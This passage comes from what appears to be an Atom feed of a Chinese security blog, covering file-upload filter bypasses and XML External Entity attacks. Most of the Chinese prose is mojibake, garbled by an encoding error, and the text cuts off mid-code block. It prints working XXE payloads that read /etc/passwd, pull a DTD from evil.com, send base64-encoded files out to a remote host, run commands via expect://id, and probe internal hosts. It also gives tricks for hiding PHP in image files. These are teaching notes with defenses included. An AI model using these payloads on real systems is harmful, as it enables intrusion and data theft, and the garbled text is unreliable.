ä¸€å¥è¯æœ¨é©¬ï¼Œé€šè¿‡èœåˆ€è¿æ¥å¯ä»¥è§£æphp<br>æˆå› ï¼š<br>    åœ¨ PHP manual ä¸­æåˆ°äº†ä¸‹é¢ä¸€æ®µè¯<br>    move_uploaded_file section, there is a warning which states â€˜If the destination file already exists, it will be overwritten.â€™<br>    å¦‚æœ PHP å®‰å…¨æ²¡é…ç½®å¥½<br>    å°±å¯ä»¥é€šè¿‡ move_uploaded_file å‡½æ•°æŠŠè‡ªå·±å†™çš„.htaccess æ–‡ä»¶è¦†ç›–æ‰æœåŠ¡å™¨ä¸Šçš„<br>    è¿™æ ·å°±èƒ½ä»»æ„å®šä¹‰è§£æåå•äº†</p><ul><li>è§£ææ¼æ´ï¼ˆapacheè§£ææ¼æ´ï¼Œiis6.0è§£ææ¼æ´ï¼Œnginxè§£ææ¼æ´ï¼‰</li></ul><h4 id="apacheè§£ææ¼æ´"><a href="#apacheè§£ææ¼æ´" class="headerlink" title="apacheè§£ææ¼æ´"></a>apacheè§£ææ¼æ´</h4><p>apacheæ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœæœ€å³çš„åç¼€æ— æ³•è§£æï¼Œåˆ™å°è¯•è§£æåä¸€ä¸ªåç¼€</p><h4 id="iis6-0è§£ææ¼æ´"><a href="#iis6-0è§£ææ¼æ´" class="headerlink" title="iis6.0è§£ææ¼æ´"></a>iis6.0è§£ææ¼æ´</h4><ul><li>æˆå› ä¸ºiis6.0ä¸è§£æ;åé¢çš„ï¼Œæ‰€ä»¥æäº¤evil.asp;.htmlè§£æä¸ºaspç±»å‹</li><li>è¿˜æœ‰ä¸€ä¸ªä¸ºIIS6.0çš„00æˆªæ–­æ”»å‡»</li><li>IIS6.0åŒæ–‡ä»¶ä¸Šä¼ </li><li>æ–‡ä»¶å¤¹çš„åå­—åŒ…å«<code>.asp</code>åˆ™è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶éƒ½ä»¥aspçš„å½¢å¼æ¥è§£æ</li></ul><h4 id="iis7-0-7-5è§£ææ¼æ´"><a href="#iis7-0-7-5è§£ææ¼æ´" class="headerlink" title="iis7.0/7.5è§£ææ¼æ´"></a>iis7.0/7.5è§£ææ¼æ´</h4><p>å¯¹äºphpæœ‰ä¸€ä¸ªç±»ä¼¼Nginxçš„è§£ææ¼æ´<code>evil.jpg/evil.php</code> è§£æevil.jpgä¸­çš„phpä»£ç ï¼Œè¿™ä¸ªæ¼æ´æˆå› åœ¨äºphp-cgiçš„æ¼æ´</p><h4 id="nginxè§£ææ¼æ´"><a href="#nginxè§£ææ¼æ´" class="headerlink" title="nginxè§£ææ¼æ´"></a>nginxè§£ææ¼æ´</h4><ul><li>å°†phpæ–‡ä»¶æ¢æˆå…¶ä»–å¯ä»¥é€šè¿‡çš„æ–‡ä»¶åç¼€ï¼Œè®¿é—®çš„æ—¶å€™åœ¨åé¢åŠ ä¸Š/.phpï¼Œå³evil.jpg/.phpï¼Œevil.jpgä¼šè§£æä¸ºphpçš„æ ¼å¼</li><li>%00æˆªæ–­</li><li>å…¶ä»–æ–¹å¼<br>æäº¤å‰å°†filename=â€evil.phpâ€è¯¥ä¸ºâ€evil.phpâ€.jpgâ€</li></ul><ol start="2"><li>ç™½åå•æ£€æµ‹</li></ol><ul><li>0x00æˆªæ–­ç»•è¿‡</li><li>è§£ææ¼æ´ç»•è¿‡ï¼ˆæ–‡ä»¶åä¸è¢«é‡å†™ï¼‰</li></ul><h3 id="æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰"><a href="#æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰"></a>æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰</h3><p>å›¾åƒç±»çš„æ–‡ä»¶å†…å®¹æ£€æµ‹</p><ul><li>æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆå›¾ç‰‡å¤´æ ¼å¼æ£€æµ‹ï¼‰<br>jpgå†…å®¹å¤´value= FF D8 FF E0 00 10 4A 46 49 46<br>gifå†…å®¹å¤´value= 47 49 46 38 39 61<br>pngå†…å®¹å¤´value= 89 50 4E 47</li></ul><p>åœ¨æ–‡ä»¶å¤´ååŠ ä¸Šä¸€å¥è¯æœ¨é©¬å°±èƒ½ç»•è¿‡</p><ul><li>æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹</li></ul><p>å›¾åƒæ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹å¸¸ç”¨çš„å°±æ˜¯phpçš„getimagesize()å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„æ³¨é‡ŠåŒºï¼ˆdataåŒºï¼‰æ’å…¥ä¸€å¥è¯ä»£ç ï¼Œå¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure></p><ul><li>æ–‡ä»¶åŠ è½½æ£€æµ‹</li></ul><p>è°ƒç”¨APIæˆ–å‡½æ•°å»è¿›è¡Œæ–‡ä»¶åŠ è½½æµ‹è¯•ï¼Œå¸¸è§çš„æ˜¯å›¾åƒæ¸²æŸ“æµ‹è¯•ï¼ŒäºŒæ¬¡æ¸²æŸ“ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œå†ä¸‹è½½ä¸‹æ¥ï¼Œdiffä¸€ä¸‹æ‰¾åˆ°ä¸å˜çš„ä½ç½®æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æˆåŠŸç‡ä¸é«˜</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><h6 id="è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡»"><a href="#è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡»" class="headerlink" title="è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡»"></a>è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡»</h6><ol><li>ç»•è¿‡ javascript å¯¹æ‰©å±•åçš„æ£€æµ‹<br> &lt;ç”¨ burp ä¹‹ç±»çš„åå‘ä»£ç†å·¥å…·ç›´æ¥ POST æ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡å‰ç«¯æ£€æµ‹&gt;</li><li>ç»•è¿‡æœåŠ¡ç«¯å¯¹ http request åŒ… MIME ç±»å‹æ£€æµ‹<br> &lt;ç”¨ burp ä¹‹ç±»çš„åå‘ä»£ç†å·¥å…·ä¼ªé€  POST æ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡ MIME æ£€æµ‹&gt;</li></ol><h6 id="è·¯å¾„-æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡»"><a href="#è·¯å¾„-æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡»" class="headerlink" title="è·¯å¾„/æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡»"></a>è·¯å¾„/æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡»</h6><ol><li><p>é»‘åå•ç»•è¿‡<br> æ–‡ä»¶åå¤§å°å†™ç»•è¿‡<br> åå•åˆ—è¡¨ç»•è¿‡<br> ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡<br> 0x00 æˆªæ–­ç»•è¿‡<br> .htaccess æ–‡ä»¶æ”»å‡»<br> æœ¬åœ°åŒ…å«æ¼æ´<br> Apache è§£ææ¼æ´<br> IIS è§£ææ¼æ´<br> Nginx è§£ææ¼æ´</p></li><li><p>ç™½åå•ç»•è¿‡<br> 0x00 æˆªæ–­ç»•è¿‡<br> æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´<br> IIS è§£ææ¼æ´<br> Nginx è§£ææ¼æ´</p></li><li>æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡æ”»å‡»</li></ol><h6 id="æ–‡ä»¶åŠ è½½æµ‹è¯•ç»•è¿‡"><a href="#æ–‡ä»¶åŠ è½½æµ‹è¯•ç»•è¿‡" class="headerlink" title="æ–‡ä»¶åŠ è½½æµ‹è¯•ç»•è¿‡"></a>æ–‡ä»¶åŠ è½½æµ‹è¯•ç»•è¿‡</h6><p>&lt;å¯¹æ–‡ä»¶è¿›è¡Œä»£ç æ³¨å…¥å†é…åˆä»»æ„è§£æè°ƒç”¨/æ¼æ´&gt;</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h3&gt;&lt;p&gt;è¿™å‡ å¤©ç©ºä¸‹æ¥æ ¹æ®&lt;a href=&quot;http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ä¸Šä¼ æ”»å‡»æ¡†æ¶&lt;/a&gt;å­¦ä¹ æ€»ç»“ä¸€ä¸‹ä¸Šä¼ æ”»å‡»ã€‚&lt;br&gt;
    
    </summary>
    
      <category term="notes" scheme="http://blog.0kami.cn/categories/notes/"/>
    
    
      <category term="vul" scheme="http://blog.0kami.cn/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>ã€VULNERABLITYã€‘XML External Entity(XXE)</title>
    <link href="http://blog.0kami.cn/2016/06/28/old-xxe/"/>
    <id>http://blog.0kami.cn/2016/06/28/old-xxe/</id>
    <published>2016-06-28T08:33:43.000Z</published>
    <updated>2018-01-25T07:33:15.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h3><p>XMLçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ‘˜è‡ª<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">security.tencent.com</a><br><a id="more"></a><br>XMLä¾‹å­<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span>  xmlå£°æ˜</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[   æ–‡æ¡£ç±»å‹å®šä¹‰</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT heading   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> æ–‡æ¡£å…ƒç´ </span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>This is a Test<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ä¸Šè¿°ä¸ºä¸€ä¸ªXMLçš„å®ä¾‹<br>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p><h6 id="å†…éƒ¨å£°æ˜DTD"><a href="#å†…éƒ¨å£°æ˜DTD" class="headerlink" title="å†…éƒ¨å£°æ˜DTD"></a>å†…éƒ¨å£°æ˜DTD</h6><p><code>&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code></p><h6 id="å¼•ç”¨å¤–éƒ¨DTD"><a href="#å¼•ç”¨å¤–éƒ¨DTD" class="headerlink" title="å¼•ç”¨å¤–éƒ¨DTD"></a>å¼•ç”¨å¤–éƒ¨DTD</h6><p><code>&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;</code>æˆ–è€…<code>&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;public_ID&quot; &quot;æ–‡ä»¶å&quot;&gt;</code><br>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p><h6 id="å†…éƒ¨å£°æ˜å®ä½“"><a href="#å†…éƒ¨å£°æ˜å®ä½“" class="headerlink" title="å†…éƒ¨å£°æ˜å®ä½“"></a>å†…éƒ¨å£°æ˜å®ä½“</h6><p><code>&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code></p><h6 id="å¼•ç”¨å¤–éƒ¨å®ä½“"><a href="#å¼•ç”¨å¤–éƒ¨å®ä½“" class="headerlink" title="å¼•ç”¨å¤–éƒ¨å®ä½“"></a>å¼•ç”¨å¤–éƒ¨å®ä½“</h6><p><code>&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</code>æˆ–è€…<code>&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p><h6 id="æ¼æ´æè¿°æ‘˜è‡ªOWASP"><a href="#æ¼æ´æè¿°æ‘˜è‡ªOWASP" class="headerlink" title="æ¼æ´æè¿°æ‘˜è‡ªOWASP"></a>æ¼æ´æè¿°æ‘˜è‡ª<a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank" rel="noopener">OWASP</a></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.</span><br></pre></td></tr></table></figure><p>æ¼æ´æˆå› ä¸ºXMLè§£æå™¨é…ç½®ä¸å®‰å…¨æ—¶ï¼Œå½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p><h3 id="è¯•éªŒ"><a href="#è¯•éªŒ" class="headerlink" title="è¯•éªŒ"></a>è¯•éªŒ</h3><p>æ¶æ„å¼•å…¥å¤–éƒ¨å®ä½“æ–¹å¼ï¼š</p><ul><li>æœ¬åœ°æ–‡ä»¶è¯»å–</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>è¿œç¨‹æ–‡ä»¶è¯»å–</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % d SYSTEM "http://evil.com/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br><span class="line">å…¶ä¸­evil.dtdæ–‡ä»¶å†…å®¹</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœé‡åˆ°è¯»å–å¤šè¡Œçš„æ–‡ä»¶ï¼Œå¯èƒ½ä¼šè¯»ä¸å‡ºæ¥ï¼Œè¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸‹<a href="http://zone.wooyun.org/content/26651" target="_blank" rel="noopener">ftpæ¥å—xxeæ•°æ®</a><br>ä¸åŒçš„è¯­è¨€é»˜è®¤æ”¯æŒçš„åè®®ä¸åŒ</p><table><thead><tr><th>libxml2</th><th>php</th><th>java</th><th>.net</th></tr></thead><tbody><tr><td>file<br>http<br>ftp</td><td>file<br>http<br>ftp<br>php<br>compress.zip<br>compress.bzip2<br>data<br>glob<br>phar</td><td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td><td>http<br>file<br>https<br>ftp</td></tr></tbody></table><p>ä¸Šè¿°ä¸ºé»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥é€šè¿‡æ‰©å±•æ”¯æŒå…¶ä»–åè®®ï¼Œå¦‚php</p><table><thead><tr><th>scheme</th><th>extension required</th></tr></thead><tbody><tr><td>https<br>ftps</td><td>openssl</td></tr><tr><td>zip</td><td>zip</td></tr><tr><td>ssh2.shell<br>ssh2.exec<br>ssh2.tunnel<br>ssh2.sftp<br>ssh2.scp</td><td>ssh2</td></tr><tr><td>rar</td><td>rar</td></tr><tr><td>ogg</td><td>oggvorbis</td></tr><tr><td>expect</td><td>expect</td></tr></tbody></table><h6 id="demo1-ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶"><a href="#demo1-ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶" class="headerlink" title="demo1 ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶"></a>demo1 ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><h6 id="demo2-ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®"><a href="#demo2-ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®" class="headerlink" title="demo2 ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®"></a>demo2 ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/issue"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">è¿œç¨‹DTDæ–‡ä»¶å†…å®¹</span><br><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;"</span>&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><h6 id="demo3-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#demo3-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="demo3 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>demo3 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "expect://id"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸéœ€è¦phpçš„expectæ‰©å±•</p><h6 id="demo4-æ¢æµ‹å†…ç½‘åº”ç”¨"><a href="#demo4-æ¢æµ‹å†…ç½‘åº”ç”¨" class="headerlink" title="demo4 æ¢æµ‹å†…ç½‘åº”ç”¨"></a>demo4 æ¢æµ‹å†…ç½‘åº”ç”¨</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "http://192.168.1.20:80"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸å­˜åœ¨è¯¥ipçš„åº”ç”¨ï¼Œä¼šæœ‰warning failed to open streamï¼Œé€šè¿‡è¿™ç§æ–¹å¼æ¢æµ‹å†…å®¹åº”ç”¨<br>åŒæ—¶å¦‚æœæ‰¾åˆ°äº†å†…å®¹åº”ç”¨ï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ”»å‡»å†…ç½‘åº”ç”¨</p><h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><h6 id="æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"><a href="#æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•" class="headerlink" title="æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"></a>æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</h6><ol><li>PHPï¼š<br>libxml_disable_entity_loader(true);</li><li>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);</li><li>Pythonï¼š<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</li></ol><h6 id="æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®"><a href="#æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®" class="headerlink" title="æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®"></a>æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</h6><p>å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…ï¼ŒSYSTEMå’ŒPUBLICã€‚</p><h3 id="jsonèŠ‚ç‚¹çš„Content-Type-XXEæ”»å‡»"><a href="#jsonèŠ‚ç‚¹çš„Content-Type-XXEæ”»å‡»" class="headerlink" title="jsonèŠ‚ç‚¹çš„Content-Type XXEæ”»å‡»"></a>jsonèŠ‚ç‚¹çš„Content-Type XXEæ”»å‡»</h3><p>å¦‚ä»Šå¾ˆå¤šwebåº”ç”¨ç¨‹åºä½¿ç”¨çš„éƒ½æ˜¯jsonæ ¼å¼çš„æ•°æ®ä¼ é€’ï¼Œé€šè¿‡åœ¨http requestå¤´ä¸­å¸¦å…¥<code>Content-Type: application/json</code>è¡¨æ˜ä¼ é€’çš„æ˜¯jsonæ ¼å¼çš„æ•°æ®ã€‚ä½†æ˜¯æœ‰æ—¶å€™æœåŠ¡å™¨å¯ä»¥æ¥å—å¼€å‘äººå‘˜æ²¡æœ‰æ„æ–™åˆ°çš„å…¶ä»–æ•°æ®æ ¼å¼ï¼Œå¦‚xmlæ ¼å¼ã€‚å¦‚æœæœåŠ¡å™¨å¯ä»¥æ¥å—xmlæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½å­˜åœ¨xxeã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 